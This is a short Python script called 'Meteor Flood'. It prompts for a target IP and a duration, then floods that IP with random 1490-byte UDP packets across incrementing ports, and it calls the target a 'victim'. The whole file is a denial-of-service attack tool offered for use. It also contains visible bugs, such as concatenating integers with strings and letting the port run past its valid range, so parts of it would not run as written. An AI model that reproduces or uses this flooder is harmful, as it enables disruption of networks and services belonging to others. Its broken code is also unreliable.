import random
import sys
import os
import socket
import time

def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def banner():
    logo = """"
            Banner Coming soon
            till then injoy
            without it
            hope its okay
            """
    print(logo)

def exeet():
    print("\nThanks For Using Meteor Flood..")
    print("\tWe Hope To See You Again")



clr()
banner()
port = 1
ip = input("\nEnter IP: ")
dur = int(input("\tEnter Duration:"))
bytes = random._urandom(1490)
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sent = int(0)
timeout = time.time()+dur
print
while True and time.time()<timeout:
    clr()
    banner()
    try:
        socket.sendto(bytes,(ip, port))
        sent = sent+1
        port = port+1
        print("Sent " + sent + " packet to " + ip + " throught port: " + port)
        print("Your Victim is hacked\n\tGrand Salute To Creator")
    except KeyboardInterrupt:
        exeet()
        sys.exit()








